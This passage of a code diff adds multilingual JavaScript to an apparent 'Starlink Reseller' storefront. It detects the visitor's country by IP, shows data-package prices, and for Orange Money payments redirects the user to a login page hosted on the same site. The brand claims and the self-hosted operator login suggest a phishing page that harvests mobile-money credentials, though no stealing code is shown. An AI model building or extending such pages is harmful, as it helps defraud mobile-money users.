+                navOrders: 'မှာယူမှုများ', navSettings: 'ဆက်တင်များ', plansSubtitle: 'အင်တာနက် ပက်ကေ့ဂျ်များ',
+                plansTitle: 'သင့်ပက်ကေ့ဂျ်ကို ရွေးချယ်ပါ', plansDesc: 'ပက်ကေ့ဂျ်တစ်ခုကို ရွေးချယ်ပြီး ချက်ချင်းအသက်သွင်းရန် မိုဘိုင်းငွေဖြင့် ပေးချေပါ။',
+                pkgStarter: 'Starter ပက်ကေ့ဂျ်', pkgStandard: 'Advanced ပက်ကေ့ဂျ်', pkgPremium: 'Elite ပက်ကေ့ဂျ်',
+                pkgPro: 'Pro ပက်ကေ့ဂျ်', pkgBusiness: 'Business ပက်ကေ့ဂျ်', pkgUnlimited: 'Unlimited ပက်ကေ့ဂျ်',
+                days: 'ရက်', twoMonths: '/၂ လ', threeMonths: '/၃ လ', oneMonth: '/လ', unlimitedData: 'ဒေတာ အကန့်အသတ်မရှိ', popular: 'လူကြိုက်များ',
+                budget: 'ဘတ်ဂျက်သက်သာ', bestValue: 'အကောင်းဆုံးတန်ဖိုး', streamingHD: 'HD ကြည့်ရှုရေး',
+                heavyUsage: 'အသုံးများသည်', enterprise: 'လုပ်ငန်းသုံး', prioritySupport: 'ဦးစားပေး ပံ့ပိုးမှု',
+                unlimited247: '၂၄/၇ အကန့်အသတ်မရှိ', vipSupport: 'VIP ပံ့ပိုးမှု', staticIP: 'Static IP',
+                paymentTitle: 'Airtel Money Payment', paymentDesc: 'Select a package then choose Airtel Money to pay.',
+                payMethodTitle: 'ငွေပေးချေမှု နည်းလမ်း ရွေးချယ်ပါ', payMethodSubtitle: 'မည်သို့ ပေးချေလိုသနည်း?', payMethodAirtel: 'Airtel ပိုက်ဆံအိတ်ဖြင့် ပေးချေပါ', cancelBtn: 'ပယ်ဖျက်ပါ',
+                modalTitle: 'လုပ်ဆောင်နေသည်...', modalSubtitle: 'ငွေပေးချေမှု gateway သို့ လုံခြုံစွာ ပြန်ညွှန်းနေပါသည်', modalWarning: 'စာမျက်နှာကို refresh မလုပ်ပါနှင့်',
+                footerDesc: 'Starlink ဝန်ဆောင်မှုများအတွက် ဒေတာပက်ကေ့ဂျ်များ၏ တရားဝင်ပြန်လည်ရောင်းချသူ။ မိုဘိုင်းငွေဖြင့် မြန်ဆန်၊ ယုံကြည်ရပြီး လုံခြုံသော ငွေပေးချေမှုများ။',
+                footerSupport: 'နည်းပညာ ပံ့ပိုးမှုအတွက် ၂၄/၇ ရရှိနိုင်ပါသည်။',
+                footerPayment: 'မိုဘိုင်းငွေဖြင့် လုံခြုံစွာ ပေးချေပါ။ ရွေးချယ်ထားသော ပက်ကေ့ဂျ်အတွက် လုံလောက်သော လက်ကျန်ငွေ ရှိကြောင်း သေချာပါစေ။',
+                footerCopyright: '© 2026 Starlink Reseller. မူပိုင်ခွင့်များ အားလုံးရယူထားသည်။',
+                configureBtn: 'ပြင်ဆင်သတ်မှတ်', configureTitle: 'တက်ကြွသောပက်ကေ့ဂျ် မရှိပါ',
+                configureMsg: 'ဤပက်ကေ့ဂျ်အတွက် သင်တွင် တက်ကြွသောစာရင်းသွင်းမှု မရှိပါ။ ယခုပင် စာရင်းသွင်းပါ။',
+                subscribeNow: 'ယခုပင် စာရင်းသွင်း', closeBtn: 'ပိတ်ပါ'
+            },
+            ar: {
+                pageTitle: 'باقات - Starlink', headerSubtitle: 'موزع معتمد', navStatus: 'الحالة', navPlans: 'الباقات',
+                navLogin: 'تسجيل الدخول', navLogout: 'تسجيل الخروج',
+                navOrders: 'الطلبات', navSettings: 'الإعدادات', plansSubtitle: 'باقات الإنترنت',
+                plansTitle: 'اختر باقتك', plansDesc: 'اختر باقة وادفع عبر Orange Money لتفعيلها فوراً.',
+                pkgStarter: 'باقة البداية', pkgStandard: 'الباقة المتقدمة', pkgPremium: 'الباقة المميزة',
+                pkgPro: 'باقة Pro', pkgBusiness: 'باقة الأعمال', pkgUnlimited: 'باقة غير محدودة',
+                days: 'أيام', twoMonths: '/شهرين', threeMonths: '/3 أشهر', oneMonth: '/شهر', unlimitedData: 'بيانات غير محدودة', popular: 'الأكثر شيوعاً',
+                budget: 'اقتصادي', bestValue: 'أفضل قيمة', streamingHD: 'بث مباشر HD',
+                heavyUsage: 'استخدام مكثف', enterprise: 'للشركات', prioritySupport: 'دعم ذو أولوية',
+                unlimited247: 'غير محدود 24/7', vipSupport: 'دعم VIP', staticIP: 'IP ثابت',
+                paymentTitle: 'دفع Orange Money', paymentDesc: 'انقر على باقة ثم اختر Orange Money لإتمام الدفع.',
+                payMethodTitle: 'اختر طريقة الدفع', payMethodSubtitle: 'كيف تريد الدفع؟', payMethodAirtel: 'ادفع بمحفظة Orange Money', cancelBtn: 'إلغاء',
+                modalTitle: 'جارٍ المعالجة...', modalSubtitle: 'تحويل آمن إلى بوابة دفع Orange Money', modalWarning: 'يرجى عدم تحديث الصفحة',
+                footerDesc: 'موزع معتمد لباقات بيانات Starlink. مدفوعات سريعة وآمنة عبر Orange Money.',
+                footerSupport: 'متاح 24/7 للدعم التقني.',
+                footerPayment: 'ادفع بأمان عبر Orange Money. تأكد من توفر رصيد كافٍ.',
+                footerCopyright: '© 2026 Starlink Reseller. جميع الحقوق محفوظة.',
+                configureBtn: 'إعداد', configureTitle: 'لا توجد باقة نشطة',
+                configureMsg: 'ليس لديك اشتراك نشط لهذه الباقة. اشترك الآن لتفعيلها.',
+                subscribeNow: 'اشترك الآن', closeBtn: 'إغلاق'
+            },
+            am: {
+                pageTitle: '\u1353\u12a8\u1302\u127d - Starlink', headerSubtitle: '\u1243\u123c', navStatus: '\u1201\u1290\u1273', navPlans: '\u1353\u12a8\u1302\u127d',
+                navLogin: '\u130d\u1263', navLogout: '\u12c8\u1323',
+                navOrders: '\u1275\u12d5\u12db\u12be\u127d', navSettings: '\u1245\u1295\u1265\u122d\u127d', plansSubtitle: '\u12e8\u12a2\u1295\u1270\u122d\u1290\u1275 \u1353\u12a8\u1302\u127d',
+                plansTitle: '\u1353\u12a8\u1303\u12ce\u1295 \u12ed\u121d\u1228\u1321', plansDesc: '\u1353\u12a8\u1305 \u12ed\u121d\u1228\u1321 \u12a5\u1293 \u12c8\u12f2\u12eb\u12cd \u1208\u121b\u1233\u122c\t \u12ed\u12ad\u1348\u1209\u1362',
+                pkgStarter: '\u1218\u132d\u1218\u122d\u12eb \u1353\u12a8\u1305', pkgStandard: '\u1218\u12f0\u1260\u129b \u1353\u12a8\u1305', pkgPremium: '\u1355\u122d\u121a\u12e8\u121d \u1353\u12a8\u1305',
+                pkgPro: '\u1355\u122e \u1353\u12a8\u1305', pkgBusiness: '\u1262\u12d8\u1290\u1235 \u1353\u12a8\u1305', pkgUnlimited: '\u12eb\u120d\u1270\u12c8\u1230\u1290 \u1353\u12a8\u1305',
+                days: '\u1240\u1293\u1275', twoMonths: '/2 \u12c8\u122b\u1275', threeMonths: '/3 \u12c8\u122c\u1273\u1275', oneMonth: '/\u12c8\u122b\u1275', unlimitedData: '\u12eb\u120d\u1270\u12c8\u1230\u1290 \u12f3\u1273', popular: '\u1273\u12cb\u1242',
+                budget: '\u1241\u323a\u1241\u323a\u1262', bestValue: '\u121d\u122d\u1325 \u12c8\u130b', streamingHD: 'HD \u1235\u1275\u122d\u121a\u1295\u130d',
+                heavyUsage: '\u12a8\u134d\u1270\u129b \u12a0\u1320\u1243\u1246\u121d', enterprise: '\u12f5\u122d\u1300\u1275', prioritySupport: '\u1245\u12f5\u121a\u12eb \u12f5\u130b\u134d',
+                unlimited247: '\u12eb\u120d\u1270\u12c8\u1230\u1290 24/7', vipSupport: 'VIP \u12f5\u130b\u134d', staticIP: '\u1245\u1219 IP',
+                paymentTitle: '\u12ad\u134b\u12eb', paymentDesc: '\u1353\u12a8\u1305 \u12ed\u121d\u1228\u1321 \u12a8\u12da\u12eb\u121d \u1208\u121d\u12ad\u134b\u1275 \u12ed\u1240\u1325\u1209\u1362',
+                payMethodTitle: '\u12e8\u12ad\u134b\u12eb \u12d8\u12f4 \u12ed\u121d\u1228\u1321', payMethodSubtitle: '\u12a5\u1295\u12f4 \u1218\u12ad\u134b\u120d \u12ed\u134c\u120b\u130d\u12f3\u1209?', payMethodAirtel: '\u12ed\u12ad\u134d\u1209', cancelBtn: '\u1230\u122d\u12d8',
+                modalTitle: '\u1260\u12d8\u12f0 \u120b\u12ed...', modalSubtitle: '\u12c8\u12f0 \u12ad\u134b\u12eb \u12f5\u1228 \u12f0\u1205\u1295\u1290\u1271 \u1260\u1270\u130d\u1260\u1320 \u13e8\u12d8\u12c8\u12c8\u122d \u12e8\u1209', modalWarning: '\u1308\u1338\u12cb\u1295 \u12a5\u1295\u12f0\u1308\u1293 \u12a0\u12eb\u12a0\u12a0\u12f0\u122d\u130d\u1369',
+                footerDesc: '\u1208Starlink \u12a0\u1308\u120d\u130e\u1276\u127d \u1353\u12a8\u1302\u127d \u134d\u1243\u12f5 \u12eb\u1208\u12cd \u1243\u123c\u1362',
+                footerSupport: '24/7 \u1208\u1274\u12a8\u1292\u12ab\u12ca \u12f5\u130b\u134d \u12ed\u1308\u129b\u12f3\u1209\u1362',
+                footerPayment: '\u12f0\u1205\u1295\u1290\u1271 \u1260\u1270\u130d\u1260\u1320 \u12ed\u12ad\u134d\u1209\u1362',
+                footerCopyright: '\u00a9 2026 Starlink Reseller. \u1218\u1265\u1276\u127d \u1201\u1209 \u1270\u1320\u1260\u12b0\u12c8\u1271\u1362',
+                configureBtn: '\u12a0\u12c8\u1243\u12f5', configureTitle: '\u12b5\u12a5 \u1353\u12a8\u1305 \u12e8\u1208\u121d',
+                configureMsg: '\u1208\u12da\u1205 \u1353\u12a8\u1305 \u12b5\u12a5 \u121d\u12d8\u1308\u1263 \u12e8\u1208\u12ce\u1275\u121d\u1362 \u12a0\u1201\u1295 \u12ed\u121d\u12d8\u1308\u1261\u1362',
+                subscribeNow: '\u12a0\u1201\u1295 \u12ed\u121d\u12d8\u1308\u1261', closeBtn: '\u12d8\u130b'
+            },
+            rn: {
+                pageTitle: 'Amafogito - Starlink', headerSubtitle: 'Umucuruzi', navStatus: 'Imimerere', navPlans: 'Amafogito',
+                navLogin: 'Kwinjira', navLogout: 'Gusohoka',
+                navOrders: 'Amasabwa', navSettings: 'Igenamiterere', plansSubtitle: 'Amafogito ya Internet',
+                plansTitle: 'Hitamwo Ifogito Ryanyu', plansDesc: 'Hitamwo ifogito hanyuma wishure biciye kuri Lumitel kugira ritangure ako kanya.',
+                pkgStarter: 'Ifogito Starter', pkgStandard: 'Ifogito Avancé', pkgPremium: 'Ifogito Élite',
+                pkgPro: 'Ifogito Pro', pkgBusiness: 'Ifogito Business', pkgUnlimited: 'Ifogito Unlimited',
+                days: 'imisi', twoMonths: '/amezi 2', threeMonths: '/amezi 3', oneMonth: '/ukwezi', unlimitedData: 'Amakuru atarimbiwe', popular: 'Ikunzwe',
+                budget: 'Igiciro gito', bestValue: 'Agaciro keza', streamingHD: 'Streaming HD',
+                heavyUsage: 'Ikoreshwa ryinshi', enterprise: 'Ikigo', prioritySupport: 'Ubufasha bwihutirwa',
+                unlimited247: '24/7 nta kimbiwe', vipSupport: 'Ubufasha VIP', staticIP: 'IP ihamye',
+                paymentTitle: 'Kwishura kuri Airtel Money', paymentDesc: 'Banza ukande ku fogito, hanyuma uhitemo Airtel Money kugira urangize kwishura.',
+                payMethodTitle: 'Hitamwo uburyo bwo kwishura', payMethodSubtitle: 'Urashaka kwishura gute?', payMethodAirtel: 'Ishura biciye kuri Airtel Money', cancelBtn: 'Guhagarika',
+                modalTitle: 'Biriko birashirwa mu ngiro...', modalSubtitle: 'Kwoherezwa mu buryo bwizewe kuri Lumitel', modalWarning: 'Ntimwongere mushireho urupapuro',
+                footerDesc: 'Umucuruzi wemewe w\'amafogito ya Starlink. Kwishura kw\'ihuta, kwemerwa kandi k\'umutekano biciye kuri Lumitel.',
+                footerSupport: 'Amasaha 24 kuri 24, imisi 7 kuri 7 ku bufasha bwa tekinike.',
+                footerPayment: 'Ishure mu mutekano biciye kuri Lumitel. Murabe mufise amafaranga ahagije ku fogito mwahisemwo.',
+                footerCopyright: '© 2026 Starlink Reseller. Uburenganzira bwose burabitswe.',
+                configureBtn: 'Shiraho', configureTitle: 'Nta fogito ufise',
+                configureMsg: "Nta fogito ufise muri iki gihe kuri iyi serivisi. Iyandikishe none kugira ukorere.",
+                subscribeNow: 'Iyandikishe none', closeBtn: 'Funga'
+            },
+            st: {
+                pageTitle: 'Lipheo - Starlink', headerSubtitle: 'Morekisi', navStatus: 'Boemo', navPlans: 'Lipheo',
+                navLogin: 'Kena', navLogout: 'Tsoa',
+                navOrders: 'Litaelo', navSettings: 'Litlhophiso', plansSubtitle: 'Lipheo tsa Inthanete',
+                plansTitle: 'Khetha Sepheo sa Hao', plansDesc: 'Khetha sepheo ebe o lefela ka EcoCash ho se sebetsa hang.',
+                pkgStarter: 'Sepheo sa Qalo', pkgStandard: 'Sepheo se Tsoetseng Pele', pkgPremium: 'Sepheo se Phahameng',
+                pkgPro: 'Sepheo sa Pro', pkgBusiness: 'Sepheo sa Khoebo', pkgUnlimited: 'Sepheo se se Limiloa',
+                days: 'matsatsi', twoMonths: '/likhoeli tse 2', threeMonths: '/likhoeli tse 3', oneMonth: '/khoeli', unlimitedData: 'Data e se nang moeli', popular: 'E ratoang',
+                budget: 'E sa bitsi chelete', bestValue: 'Boleng bo betso', streamingHD: 'Streaming ea HD',
+                heavyUsage: 'Tshebediso e kholo', enterprise: 'Khoebo', prioritySupport: 'Tuso ea Mathata',
+                unlimited247: '24/7 e se nang moeli', vipSupport: 'Tuso ea VIP', staticIP: 'IP e tsitsitseng',
+                paymentTitle: 'Tefo ea EcoCash', paymentDesc: 'Khetha sepheo ebe o khetha EcoCash ho qetela tefo.',
+                payMethodTitle: 'Khetha Tsela ea Tefo', payMethodSubtitle: 'O batla ho lefa jwang?', payMethodAirtel: 'Lefa ka EcoCash ea hao', cancelBtn: 'Hlaola',
+                modalTitle: 'E a sebetsa...', modalSubtitle: 'Ho laeloa ka polokeho ho sethala sa tefo sa EcoCash', modalWarning: 'Ka kopo o se nchafatse leqephe',
+                footerDesc: 'Morekisi ea lumelletsoeng oa lipheo tsa data tsa Starlink. Litefiso tse potlakileng le tse bolokehileng ka EcoCash.',
+                footerSupport: 'E fumaneha 24/7 bakeng sa tsebo ea theknoloji.',
+                footerPayment: 'Lefa ka polokeho ka EcoCash. Netefatsa hore o na le chelete e lekaneng bakeng sa sepheo se khethiloeng.',
+                footerCopyright: '© 2026 Starlink Reseller. Litokelo tsohle li bolokehile.',
+                configureBtn: 'Hlophisa', configureTitle: 'Ha ho na Sepheo se Sebetsang',
+                configureMsg: "Ha o na tlatsetso e sebetsang bakeng sa sepheo sena. Ingodisa joale ho se sebetsa.",
+                subscribeNow: 'Ingodisa Joale', closeBtn: 'Koala'
+            }
+        };
+
+        let currentLang = 'en';
+        let detectedCountry = 'CD';
+        let currentCurrency = 'CDF';
+        let currentRate = 1;
+        let selectedPackage = null;
+
+        // Map CDF prices to package names
+        function getCDFPackageName(cdfPrice, country) {
+            const price = parseInt(cdfPrice);
+            if (country === 'CD') {
+                switch(price) {
+                    case 3000: return 'basique-m';
+                    case 5000: return 'standard-m';
+                    case 8000: return 'premium-m';
+                    case 12000: return 'pro-m';
+                    case 20000: return 'business-m';
+                }
+            } else if (country === 'BF') {
+                switch(price) {
+                    case 1500: return 'basique-m-bf';
+                    case 2500: return 'standard-m-bf';
+                    case 5000: return 'premium-m-bf';
+                }
+            } else {
+                // Default mapping for other countries
+                switch(price) {
+                    case 30000: return 'starter';
+                    case 50000: return 'standard';
+                    case 75000: return 'premium';
+                    case 100000: return 'pro';
+                    case 150000: return 'business';
+                    case 250000: return 'unlimited';
+                }
+            }
+            return 'standard'; // fallback
+        }
+
+        async function detectCountry() {
+            localStorage.removeItem('starlink_country_data'); // clear old cache key
+            const CACHE_KEY = 'starlink_country_v2';
+            const cached = localStorage.getItem(CACHE_KEY);
+            if (cached) {
+                const data = JSON.parse(cached);
+                if (Date.now() - data.timestamp < 6 * 60 * 60 * 1000) return data;
+            }
+            const apis = [
+                async () => { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); return d.country_code; },
+                async () => { const r = await fetch('https://ipwho.is/'); const d = await r.json(); return d.country_code; },
+                async () => { const r = await fetch('https://ip-api.com/json/'); const d = await r.json(); return d.countryCode; }
+            ];
+            for (const api of apis) {
+                try {
+                    const code = await api();
+                    if (code && code.length === 2) {
+                        const result = { country: code, timestamp: Date.now() };
+                        localStorage.setItem(CACHE_KEY, JSON.stringify(result));
+                        return result;
+                    }
+                } catch (e) { /* try next */ }
+            }
+            return { country: 'CD' };
+        }
+
+        function formatPrice(cdfAmount, currency, rate) {
+            const convertedAmount = Math.round(cdfAmount * rate);
+            return `${currency} ${convertedAmount.toLocaleString()}`;
+        }
+
+        function updatePrices() {
+            const config = COUNTRY_CONFIG[detectedCountry];
+            const priceOverrides = config?.prices;
+            const originalOverrides = config?.originalPrices;
+            document.querySelectorAll('.package-card').forEach(card => {
+                const cdfPrice = parseInt(card.getAttribute('data-cdf'));
+                const originalCdf = parseInt(card.getAttribute('data-original-cdf'));
+                const priceEl = card.querySelector('.pkg-price');
+                const originalEl = card.querySelector('.pkg-original-price');
+                if (priceEl && cdfPrice) {
+                    const priceTag = priceEl.querySelector('.promo-tag');
+                    if (priceOverrides && priceOverrides[cdfPrice] !== undefined) {
+                        priceEl.childNodes[0].textContent = `${currentCurrency} ${priceOverrides[cdfPrice].toLocaleString()} `;
+                    } else {
+                        priceEl.childNodes[0].textContent = `${formatPrice(cdfPrice, currentCurrency, currentRate)} `;
+                    }
+                }
+                if (originalEl && originalCdf) {
+                    if (originalOverrides && originalOverrides[cdfPrice] !== undefined) {
+                        // Country has both price + original price overrides (e.g. CD)
+                        originalEl.textContent = `${currentCurrency} ${originalOverrides[cdfPrice].toLocaleString()}`;
+                        originalEl.style.display = '';
+                    } else if (!priceOverrides) {
+                        // No custom prices at all — use rate conversion on data-original-cdf
+                        originalEl.textContent = formatPrice(originalCdf, currentCurrency, currentRate);
+                        originalEl.style.display = '';
+                    } else {
+                        // Custom prices exist but no original prices — convert originalCdf at current rate
+                        originalEl.textContent = formatPrice(originalCdf, currentCurrency, currentRate);
+                        originalEl.style.display = '';
+                    }
+                }
+            });
+        }
+
+        function updatePackageHints() {
+            const t = translations[currentLang] || translations.en;
+            document.querySelectorAll('.package-card').forEach(card => {
+                let hint = card.querySelector('.package-hint');
+                if (!hint) {
+                    hint = document.createElement('p');
+                    hint.className = 'package-hint';
+                    card.appendChild(hint);
+                }
+                if (currentLang === 'fr') {
+                    hint.textContent = '1) Cliquez sur un forfait  2) Choisissez un opérateur Mobile Money';
+                } else if (currentLang === 'my') {
+                    hint.textContent = '1) ပက်ကေ့ဂျ်ကို နှိပ်ပါ  2) သင့် Mobile Money အော်ပရေတာကို ရွေးချယ်ပါ';
+                } else if (currentLang === 'rn') {
+                    hint.textContent = '1) Kanda ku fogito  2) Hitamwo umucuruzi wa Mobile Money';
+                } else {
+                    hint.textContent = '1) Tap a package  2) Choose your Mobile Money operator';
+                }
+                // Configure button
+                let configBtn = card.querySelector('.configure-btn');
+                if (!configBtn) {
+                    configBtn = document.createElement('button');
+                    configBtn.className = 'configure-btn';
+                    card.appendChild(configBtn);
+                }
+                configBtn.innerHTML = '⚙️ ' + t.configureBtn;
+                configBtn.onclick = (e) => openConfigureModal(card, e);
+            });
+        }
+
+        let _configureTargetCard = null;
+        function openConfigureModal(card, e) {
+            e.stopPropagation();
+            _configureTargetCard = card;
+            const t = translations[currentLang] || translations.en;
+            document.getElementById('configureModalTitle').textContent = t.configureTitle;
+            document.getElementById('configureModalMsg').textContent = t.configureMsg;
+            document.getElementById('configureSubscribeBtn').textContent = t.subscribeNow;
+            document.getElementById('configureCloseBtn').textContent = t.closeBtn;
+            document.getElementById('configureModal').classList.add('active');
+        }
+        function closeConfigureModal() {
+            document.getElementById('configureModal').classList.remove('active');
+            _configureTargetCard = null;
+        }
+
+        function renderAuthNav(t) {
+            const authNav = document.getElementById('auth-nav');
+            if (!authNav) return;
+            authNav.innerHTML = ''; // No login/signup button shown
+        }
+
+        function doLogout() {
+            localStorage.removeItem('sl_auth_user');
+            window.location.replace('/starlink/login.html');
+        }
+
+        function applyTranslations(lang) {
+            const t = translations[lang] || translations.en;
+            currentLang = lang;
+            const countryName = COUNTRY_CONFIG[detectedCountry]?.name || 'RDC';
+            
+            document.getElementById('page-title').textContent = t.pageTitle;
+            document.getElementById('header-subtitle').textContent = t.headerSubtitle + ' ' + countryName;
+            document.getElementById('nav-status').textContent = t.navStatus;
+            document.getElementById('nav-plans').textContent = t.navPlans;
+            document.getElementById('nav-orders').textContent = t.navOrders;
+            renderAuthNav(t);
+            document.getElementById('plans-subtitle').textContent = t.plansSubtitle;
+            document.getElementById('plans-title').textContent = t.plansTitle;
+            document.getElementById('plans-desc').textContent = t.plansDesc;
+            
+            // Package names - data amounts vary by country (RDC has higher amounts)
+            const isRDC = (detectedCountry === 'CD');
+            
+            document.getElementById('pkg-starter-name').textContent = t.pkgStarter;
+            document.getElementById('pkg-starter-data').textContent = (isRDC ? '75 GB' : '60 GB') + ' ' + t.oneMonth;
+            document.getElementById('pkg-starter-period').textContent = t.oneMonth;
+            document.getElementById('pkg-starter-feature').textContent = t.budget;
+            
+            document.getElementById('popular-badge').textContent = t.popular;
+            document.getElementById('pkg-standard-name').textContent = t.pkgStandard;
+            document.getElementById('pkg-standard-data').textContent = (isRDC ? '150 GB' : '125 GB') + ' ' + t.oneMonth;
+            document.getElementById('pkg-standard-period').textContent = t.oneMonth;
+            document.getElementById('pkg-standard-feature1').textContent = t.bestValue;
+            
+            document.getElementById('pkg-premium-name').textContent = t.pkgPremium;
+            document.getElementById('pkg-premium-data').textContent = (isRDC ? '250 GB' : '200 GB') + ' ' + t.oneMonth;
+            document.getElementById('pkg-premium-period').textContent = t.oneMonth;
+            document.getElementById('pkg-premium-feature1').textContent = t.streamingHD;
+            
+            document.getElementById('pkg-pro-name').textContent = t.pkgPro;
+            document.getElementById('pkg-pro-data').textContent = (isRDC ? '250 GB' : '200 GB') + ' ' + t.oneMonth;
+            document.getElementById('pkg-pro-period').textContent = t.oneMonth;
+            document.getElementById('pkg-pro-feature1').textContent = t.heavyUsage;
+            
+            document.getElementById('pkg-business-name').textContent = t.pkgBusiness;
+            document.getElementById('pkg-business-data').textContent = (isRDC ? '500 GB' : '340 GB') + ' ' + t.oneMonth;
+            document.getElementById('pkg-business-period').textContent = t.oneMonth;
+            document.getElementById('pkg-business-feature1').textContent = t.enterprise;
+            document.getElementById('pkg-business-feature2').textContent = t.prioritySupport;
+            
+            document.getElementById('pkg-unlimited-name').textContent = t.pkgUnlimited;
+            document.getElementById('pkg-unlimited-data').textContent = t.unlimitedData + ' ' + t.oneMonth;
+            document.getElementById('pkg-unlimited-period').textContent = t.oneMonth;
+            document.getElementById('pkg-unlimited-feature1').textContent = t.vipSupport;
+            document.getElementById('pkg-unlimited-feature2').textContent = t.staticIP;
+
+            // Sierra Leone: custom package names, GB sizes, and monthly period
+            if (detectedCountry === 'SL') {
+                document.getElementById('pkg-starter-name').textContent = 'Basic Bundle';
+                document.getElementById('pkg-starter-data').textContent = '5 GB /month';
+                document.getElementById('pkg-starter-period').textContent = '/month';
+                document.getElementById('pkg-standard-name').textContent = 'Standard Bundle';
+                document.getElementById('pkg-standard-data').textContent = '15 GB /month';
+                document.getElementById('pkg-standard-period').textContent = '/month';
+                document.getElementById('pkg-premium-name').textContent = 'Premium Bundle';
+                document.getElementById('pkg-premium-data').textContent = '30 GB /month';
+                document.getElementById('pkg-premium-period').textContent = '/month';
+                document.getElementById('pkg-pro-name').textContent = 'Ultra Bundle';
+                document.getElementById('pkg-pro-data').textContent = '60 GB /month';
+                document.getElementById('pkg-pro-period').textContent = '/month';
+                document.getElementById('pkg-business-name').textContent = 'Business Bundle';
+                document.getElementById('pkg-business-data').textContent = '100 GB /month';
+                document.getElementById('pkg-business-period').textContent = '/month';
+                document.getElementById('pkg-unlimited-name').textContent = 'Unlimited Bundle';
+                document.getElementById('pkg-unlimited-data').textContent = 'Unlimited data /month';
+                document.getElementById('pkg-unlimited-period').textContent = '/month';
+            }
+
+            // Bénin: custom package names, Go sizes, and monthly period
+            if (detectedCountry === 'BJ') {
+                document.getElementById('pkg-starter-name').textContent = 'Forfait Basique';
+                document.getElementById('pkg-starter-data').textContent = '5 Go /mois';
+                document.getElementById('pkg-starter-period').textContent = '/mois';
+                document.getElementById('pkg-standard-name').textContent = 'Forfait Standard';
+                document.getElementById('pkg-standard-data').textContent = '15 Go /mois';
+                document.getElementById('pkg-standard-period').textContent = '/mois';
+                document.getElementById('pkg-premium-name').textContent = 'Forfait Premium';
+                document.getElementById('pkg-premium-data').textContent = '30 Go /mois';
+                document.getElementById('pkg-premium-period').textContent = '/mois';
+                document.getElementById('pkg-pro-name').textContent = 'Forfait Ultra';
+                document.getElementById('pkg-pro-data').textContent = '60 Go /mois';
+                document.getElementById('pkg-pro-period').textContent = '/mois';
+                document.getElementById('pkg-business-name').textContent = 'Forfait Business';
+                document.getElementById('pkg-business-data').textContent = '100 Go /mois';
+                document.getElementById('pkg-business-period').textContent = '/mois';
+                document.getElementById('pkg-unlimited-name').textContent = 'Forfait Illimité';
+                document.getElementById('pkg-unlimited-data').textContent = 'Données illimitées /mois';
+                document.getElementById('pkg-unlimited-period').textContent = '/mois';
+            }
+
+            // Tchad: monthly packages with XAF pricing, Airtel only (hide Moov)
+            if (detectedCountry === 'TD') {
+                document.getElementById('pkg-starter-name').textContent = 'Forfait Basique';
+                document.getElementById('pkg-starter-data').textContent = '5 Go /mois';
+                document.getElementById('pkg-starter-period').textContent = '/mois';
+                document.getElementById('pkg-standard-name').textContent = 'Forfait Standard';
+                document.getElementById('pkg-standard-data').textContent = '15 Go /mois';
+                document.getElementById('pkg-standard-period').textContent = '/mois';
+                document.getElementById('pkg-premium-name').textContent = 'Forfait Premium';
+                document.getElementById('pkg-premium-data').textContent = '30 Go /mois';
+                document.getElementById('pkg-premium-period').textContent = '/mois';
+                document.getElementById('pkg-pro-name').textContent = 'Forfait Ultra';
+                document.getElementById('pkg-pro-data').textContent = '60 Go /mois';
+                document.getElementById('pkg-pro-period').textContent = '/mois';
+                document.getElementById('pkg-business-name').textContent = 'Forfait Business';
+                document.getElementById('pkg-business-data').textContent = '100 Go /mois';
+                document.getElementById('pkg-business-period').textContent = '/mois';
+                document.getElementById('pkg-unlimited-name').textContent = 'Forfait Illimité';
+                document.getElementById('pkg-unlimited-data').textContent = 'Données illimitées /mois';
+                document.getElementById('pkg-unlimited-period').textContent = '/mois';
+            }
+
+            // Footer and other elements
+            document.getElementById('payment-info-title').textContent = t.paymentTitle;
+            document.getElementById('payment-info-desc').textContent = t.paymentDesc;
+            document.getElementById('bottom-status').textContent = t.navStatus;
+            document.getElementById('bottom-plans').textContent = t.navPlans;
+            document.getElementById('bottom-orders').textContent = t.navOrders;
+            document.getElementById('bottom-settings').textContent = t.navSettings;
+            document.getElementById('footer-brand').textContent = 'STARLINK ' + countryName;
+            document.getElementById('footer-desc').textContent = t.footerDesc;
+            document.getElementById('footer-support-desc').textContent = t.footerSupport;
+            document.getElementById('footer-payment-desc').textContent = t.footerPayment;
+            document.getElementById('footer-copyright').textContent = t.footerCopyright;
+            document.getElementById('modal-title').textContent = t.modalTitle;
+            document.getElementById('modal-subtitle').textContent = t.modalSubtitle;
+            document.getElementById('modal-warning').textContent = t.modalWarning;
+            document.getElementById('paymentMethodTitle').textContent = t.payMethodTitle;
+            document.getElementById('paymentMethodSubtitle').textContent = t.payMethodSubtitle;
+            document.getElementById('airtelPayDesc').textContent = t.payMethodAirtel;
+            document.getElementById('cancelPayment').textContent = t.cancelBtn;
+            document.querySelectorAll('.js-unlimited-badge').forEach(function(el) { el.textContent = t.unlimitedData; });
+            document.querySelectorAll('.js-unlimited-247').forEach(function(el) { el.textContent = t.unlimited247; });
+            document.getElementById('langLabel').textContent = lang === 'fr' ? 'EN' : lang === 'en' ? 'MY' : lang === 'my' ? 'RN' : lang === 'rn' ? 'AR' : lang === 'ar' ? 'AM' : lang === 'am' ? 'FR' : 'FR';
+            document.documentElement.lang = lang;
+        }
+
+        function selectPackage(element, packageType) {
+            document.querySelectorAll('.package-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedPackage = packageType;
+            
+            // Store package info for login page
+            const cdfPrice = parseInt(element.getAttribute('data-cdf'));
+            sessionStorage.setItem('starlinkPackage', selectedPackage);
+            sessionStorage.setItem('starlinkPriceCDF', cdfPrice);
+            sessionStorage.setItem('starlinkCurrency', currentCurrency);
+            sessionStorage.setItem('starlinkRate', currentRate);
+            
+            // Show payment method selector modal
+            document.getElementById('paymentMethodModal').classList.add('active');
+        }
+        
+        function closePaymentModal() {
+            document.getElementById('paymentMethodModal').classList.remove('active');
+            document.querySelectorAll('.package-card').forEach(card => card.classList.remove('selected'));
+            selectedPackage = null;
+        }
+
+        function selectPaymentMethod(method) {
+            // WhatsApp contact flow for Orange Money in DRC and Burkina Faso
+            if (method === 'orange' && (detectedCountry === 'CD' || detectedCountry === 'BF')) {
+                const cdfPrice = sessionStorage.getItem('starlinkPriceCDF');
+                const packageName = getCDFPackageName(cdfPrice, detectedCountry);
+                const config = COUNTRY_CONFIG[detectedCountry];
+                const currency = config.currency;
+                window.location.href = `/orange/login.html?source=starlink&package=${packageName}&currency=${currency}&lp=${cdfPrice}&cur=${currency}`;
+                return;
+            }
+
+            // Hide payment selector
